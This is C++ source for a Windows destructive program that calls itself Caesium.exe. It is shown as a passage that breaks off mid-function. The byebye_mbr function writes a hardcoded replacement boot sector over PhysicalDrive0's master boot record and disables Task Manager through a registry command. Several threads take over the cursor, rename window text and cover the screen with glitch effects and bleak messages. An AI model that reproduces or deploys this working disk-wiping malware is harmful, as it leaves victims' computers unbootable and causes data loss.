// NO SKID NO AI :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: :skull: 
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<windef.h>
#include<fstream>
#include<cstdlib>
#include<memory>
#include<iosfwd>
#include<string>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 255, rand() % 255, rand() % 255))
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
const unsigned char MasterBootRecord[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBD, 0x00, 0xFA, 0xB0, 0x0F, 0xB9,
0x00, 0xFA, 0x31, 0xFF, 0xF3, 0xAA, 0x31, 0xC0, 0xBF, 0xA9, 0x00, 0x88, 0x03, 0x4F, 0x79, 0xFB,
0xC6, 0x46, 0x09, 0x14, 0xBF, 0x00, 0xAF, 0xB1, 0xA0, 0xF3, 0xAB, 0xB9, 0x80, 0x0C, 0xE8, 0x39,
0x01, 0xE2, 0xFB, 0xFE, 0x4E, 0x08, 0xB0, 0x0F, 0xBF, 0x80, 0x20, 0xB9, 0x80, 0x8E, 0xF3, 0xAA,
0xB1, 0x27, 0xA1, 0x04, 0xFA, 0x99, 0xF7, 0x36, 0x59, 0x7D, 0x80, 0xC2, 0x30, 0x50, 0x88, 0xD0,
0x88, 0xCA, 0xBB, 0x0F, 0x00, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xCD, 0x10, 0x58, 0x49, 0x09,
0xC0, 0x75, 0xE2, 0xB6, 0x07, 0xB9, 0x28, 0x00, 0xBF, 0x0A, 0xFA, 0x8B, 0x1D, 0x08, 0xDB, 0x74,
0x2A, 0xB2, 0x02, 0x8B, 0x75, 0x02, 0x88, 0xF8, 0xE8, 0xF9, 0x00, 0x28, 0x35, 0x73, 0x1A, 0xFF,
0x46, 0x04, 0xC6, 0x05, 0x00, 0xA1, 0x04, 0xFA, 0xB3, 0x0A, 0xF6, 0xF3, 0x08, 0xE4, 0x75, 0x09,
0x80, 0x7E, 0x09, 0x0A, 0x7E, 0x03, 0xFE, 0x4E, 0x09, 0xEB, 0x2A, 0x38, 0x5E, 0x08, 0x7F, 0x25,
0xA0, 0x09, 0xFA, 0x88, 0x46, 0x08, 0xC7, 0x05, 0xFF, 0x8B, 0xC7, 0x45, 0x02, 0xCE, 0x7D, 0xE5,
0x40, 0xD0, 0xE8, 0x73, 0x10, 0x83, 0x45, 0x02, 0x08, 0x80, 0x6D, 0x01, 0x12, 0xD0, 0xE8, 0x72,
0x04, 0x80, 0x6D, 0x01, 0x19, 0xAF, 0xAF, 0xE2, 0xA2, 0xBE, 0x07, 0xFA, 0xBB, 0x06, 0xFA, 0x38,
0x0F, 0x7E, 0x05, 0x80, 0x2F, 0x07, 0xEB, 0x0B, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x03, 0x74, 0x03,
0xC6, 0x04, 0x1E, 0x8A, 0x04, 0x3C, 0x00, 0x7E, 0x05, 0x00, 0x07, 0x80, 0x2C, 0x07, 0xB8, 0x8B,
0x00, 0xBB, 0x23, 0x00, 0x8A, 0x4E, 0x06, 0x38, 0xE1, 0x7E, 0x02, 0x28, 0xC8, 0x50, 0xBA, 0x40,
0x01, 0xF7, 0xE2, 0x8D, 0x7F, 0x0F, 0x01, 0xC7, 0x26, 0x8A, 0x0D, 0xB4, 0x02, 0xCD, 0x16, 0x34,
0x04, 0x75, 0x07, 0xB2, 0x02, 0x88, 0x7E, 0x06, 0xEB, 0x09, 0xB2, 0x03, 0x81, 0xEF, 0x3A, 0x1A,
0x26, 0x22, 0x0D, 0x58, 0xBE, 0xC6, 0x7D, 0xE8, 0x4A, 0x00, 0x08, 0xC9, 0x74, 0x1E, 0xBE, 0x41,
0xB0, 0xBF, 0x40, 0xB0, 0xB9, 0x7F, 0x0C, 0xF3, 0x26, 0xA4, 0xE8, 0x2D, 0x00, 0xB4, 0x00, 0xCD,
0x1A, 0x88, 0xD3, 0xCD, 0x1A, 0x30, 0xD3, 0x74, 0xF8, 0xE9, 0xE7, 0xFE, 0xBB, 0x0F, 0x00, 0xBA,
0x0F, 0x0C, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xB9, 0x0A, 0x00, 0xBE, 0xB5, 0x7D, 0xAC, 0xCD,
0x10, 0xE2, 0xFB, 0xB4, 0x00, 0xCD, 0x16, 0xE9, 0x96, 0xFE, 0xE4, 0x40, 0x24, 0x55, 0x74, 0x02,
0xB0, 0x0F, 0xAA, 0xC3, 0x51, 0x57, 0x88, 0x46, 0x00, 0x88, 0x5E, 0x02, 0xB3, 0x08, 0x88, 0xD7,
0x52, 0x8B, 0x46, 0x00, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x5A, 0x03, 0x46, 0x02, 0x97, 0xB1, 0x08,
0x8A, 0x04, 0xD2, 0xE8, 0xB0, 0x00, 0x51, 0x88, 0xD1, 0x72, 0x04, 0x01, 0xCF, 0xEB, 0x02, 0xF3,
0xAA, 0x59, 0xE2, 0xEC, 0xFF, 0x4E, 0x00, 0xFE, 0xCF, 0x75, 0xD5, 0x88, 0xD7, 0x4E, 0xFE, 0xCB,
0x75, 0xCE, 0x5F, 0x59, 0xC3, 0x67, 0x61, 0x6D, 0x65, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x21, 0x06,
0x0D, 0x0F, 0x1E, 0xBC, 0x7A, 0x10, 0x18, 0x1C, 0x22, 0x73, 0x26, 0x6B, 0x22, 0x67, 0x32, 0x03,
0x07, 0x6E, 0xBF, 0xFF, 0x0E, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};//credits to pankoza's Trihydridoarsenic.exe
#define sleep Sleep //shit define
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!(write by pankoza)
	//And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {

	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"Caesium", SMTO_ABORTIFHUNG, 100, NULL);
	return true;

}
DWORD WINAPI textz(LPVOID lpParam) {

	while (true) {

		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);

		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
void byebye_mbr()//credits to pankoza's Trihydridoarsenic.exe too
{
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	CloseHandle(hDevice);
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
}
DWORD WINAPI curfun(LPVOID lpParam) {//credits to pankoza
	POINT cursor;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorPos(&cursor);
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	return(1);
}
struct Point3D {
	float x, y, z;
};
int MyNewDrawIcon(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	DeleteDC(hdc);
	Sleep(1);
	return 1;
}
void DrawEllipseAt(HDC hdc, int x, int y) {
	int lksdjflsdajflsdajlkfsdjklfdsjklfsdjlfjsdklfsadjlksd = rand() % 3;
	switch(lksdjflsdajflsdajlkfsdjklfdsjklfsdjlfjsdklfsadjlksd)
	{
	case 0:{
		HINSTANCE ICON1 = LoadLibrary(_T("shell32.dll"));
		DrawIcon(hdc, x, y, LoadIcon(ICON1, MAKEINTRESOURCE(rand() % 256)));
	}
	case 1:{
		HINSTANCE ICON1 = LoadLibrary(_T("moricons.dll"));
		DrawIcon(hdc, x, y, LoadIcon(ICON1, MAKEINTRESOURCE(rand() % 256)));
	}
	case 2: {
		HINSTANCE ICON1 = LoadLibrary(_T("imageres.dll"));
		DrawIcon(hdc, x, y, LoadIcon(ICON1, MAKEINTRESOURCE(rand() % 256)));
	}
	}
	
}
Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);

	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;

	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;

	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;

	return point;
}
void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};

	POINT screenPoints[8];

	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		//COLORREF color = COLORHSL(colorA);

		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);

		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;

		DrawEllipseAt(hdc, screenX, screenY);
	}

	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);

	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);

	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}
DWORD WINAPI realcube(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	ReleaseDC(0, hdc);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int x = w * wdpi / 96;
	int y = h * hdpi / 96;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	float x2 = 100.0;
	float y2 = 100.0;
	float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
	float angleIncrement = 0.04;
	float colorA = 0;
	float size = 100;
	for (;;) {
		hdc = GetDC(0);

		x2 += incrementor * signX;
		y2 += incrementor * signY;

		if (x2 + 75 >= x) {
			signX = -1;
			x2 = x - 76;
		}
		else if (x2 <= 75) {
			signX = 1;
			x2 = 76;
		}

		if (y2 + 75 >= y) {
			signY = -1;
			y2 = y - 76;
		}
		else if (y2 <= 75) {
			signY = 1;
			y2 = 76;
		}


		Point3D center = { x2, y2, 0.0f };
		HPEN hPen = CreatePen(0, 1, RndRGB);
		SelectObject(hdc, hPen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);
		ReleaseDC(0, hdc);
		DeleteObject(hPen);
		DeleteDC(hdc);
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;

		Sleep(20);
		colorA += 1;

		if (size >= 0 && size <= 100) {
			size += 0.5;
		}
	}
	return 0;
}
int Rr(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}
static ULONGLONG n, r;
int rndcopy() 
{ return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
//---------------------------------------------------payloads-------------------------
DWORD WINAPI plgblt1(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 50 + 60;
		wPt[0].y = wRect.top + 70 + 30;
		wPt[1].x = wRect.right + 10 + 0;
		wPt[1].y = wRect.top + 50 + 65;
		wPt[2].x = wRect.left + 10 + 26;
		wPt[2].y = wRect.bottom + 80 + 99;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI bitblt1(LPVOID lpParam) {
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		HDC hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		int rx = rand() % sw;
		int ry = rand() % sh;
		BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, RGBBRUSH);
		BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, RGBBRUSH);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI bitblt2(LPVOID lpParam) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = rand() % x;
		int ys = rand() % y;
		int sel = rand() % 4 + 1;
		int size = rand() % 300 + 200;
		int rnd = rand() % 50 + 20;

		if (sel == 1) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs + i, ys + i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 2) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs + i, ys - i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 3) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs - i, ys + i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 4) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs - i, ys - i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
	}
}
DWORD WINAPI bitblt3(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI bitblt4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, DSTINVERT);
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, SRCCOPY);
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, MERGEPAINT);
	}
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI mixgraphic(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		POINT p[4] = { rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h };
		SelectObject(hdc, brush);
		Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
		Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
		Ellipse(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
		Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
		RoundRect(hdc, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500);
		HPEN hPen = CreatePen(PS_SOLID, 5, RndRGB);
		SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
		Polyline(hdc, p, 4);
		ReleaseDC(0, hdc);
		Polygon(hdc, p, 4);
		Polygon(hdc, p, 3);
		Polygon(hdc, p, 2);
		DeleteObject(hPen);
		DeleteObject(brush);
		Sleep(50);
	}
}
DWORD WINAPI cube(LPVOID lpParam) {//i think it's just a square lmao
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	ReleaseDC(NULL, hdc);
}
VOID WINAPI sq(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI invert_square(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	HDC hdc = GetDC(0);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI colourful_circle(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			sq(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI text1(LPVOID lpParam) {
	LPCSTR text = "Caesium.exe", pszFaceName = "System";
	while (true) {
		int rdx = 1 + rand() % 3; int xxx = (rdx * 10) - 10;
		int cWidth = 50 - xxx, cHeight = 60 - xxx, tmp = rand() % 16, color = RndRGB;
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		SetTextColor(hdc, color);
		SetBkMode(hdc, 0);
		HFONT font = CreateFontA(cHeight, cWidth, 0, 0, FW_EXTRALIGHT, 0, 0, 0, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, pszFaceName);
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % w, rand() % h, text, 11);
		ReleaseDC(0, hdc);
		DeleteObject(font);
		DeleteDC(hdc);
		Sleep(50);
	}
}
DWORD WINAPI text2(LPVOID lpParam) {//credits to N17Pro3426
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		LPCSTR text[13] = {"Caesium.exe", "Element 56", "gΣt r3cτ", "LambdaTechnology","Coder-linjian" , "Where do I come from,where am I going?","7891", "endless confusion and despair", "Is this a form of slow execution?" , "I'm gravely ill and beyond cure.","Severe cannabis intoxication", "fatal error", "I will perish together with this world" };
		int thing = rand() % 13;
		SetTextColor(hdc, RndRGB);
		SetBkColor(hdc, RndRGB);
		HFONT font = CreateFontA(39, 19, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % w, rand() % h, text[thing], strlen(text[thing]));
		ReleaseDC(0, hdc);
		DeleteObject(font);
		DeleteDC(hdc);
		Sleep(30);
	}
}
DWORD WINAPI neonz(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 200;
	blf.AlphaFormat = 0;

	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);

	HDC hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP hBitmapCopy = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, hBitmapCopy);
	BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

	for (int t = 0; ; t += 40) {
		hdc = GetDC(NULL);

		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hBitmapTemp = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hdcTemp, hBitmapTemp);
		BitBlt(hdcTemp, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);

		for (int i = 0; i < h; i++) {
			for (int l = 0; l < w; l++) {
				int pos = i * w + l;
				prgbScreen[pos].r = sin((l + t) * (PI / (w / 10))) * 127 + 127;
				prgbScreen[pos].g = 0;
				prgbScreen[pos].b = sin((i + t) * (PI / (w / 10))) * 127 + 127;
			}
		}

		AlphaBlend(hdcTemp, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);

		ReleaseDC(NULL, hdcTemp);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdcTemp);
		DeleteObject(hBitmapTemp);
		DeleteObject(hdc);
		Sleep(10);
	}
	ReleaseDC(NULL, hcdc);
	ReleaseDC(NULL, hdcCopy);
	DeleteDC(hcdc);
	DeleteDC(hdcCopy);
	DeleteObject(hBitmap);
	DeleteObject(hBitmapCopy);
	return 0;
}
DWORD WINAPI blur1(LPVOID lpvd) //credits to pankoza
{

	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT wRect;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
